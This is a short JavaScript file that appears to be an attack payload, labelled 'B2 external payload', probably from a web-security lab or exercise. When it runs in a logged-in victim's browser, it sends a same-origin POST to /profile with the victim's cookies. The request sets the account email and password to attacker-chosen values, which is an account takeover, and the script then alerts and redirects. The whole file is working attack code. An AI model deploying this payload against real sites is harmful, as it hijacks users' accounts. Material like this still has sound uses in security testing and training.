(async () => {
  const newEmail = "b2-controlled@example.test";
  const newPassword = "B2-demo-password";

  const body = new URLSearchParams({
    email: newEmail,
    password: newPassword,
  });

  const response = await fetch("/profile", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    credentials: "same-origin",
    body: body.toString(),
  });

  if (!response.ok) {
    alert(`B2 payload failed: HTTP ${response.status}`);
    return;
  }

  alert(`B2 external payload changed the profile to ${newEmail}`);
  window.location.assign("/profile");
})();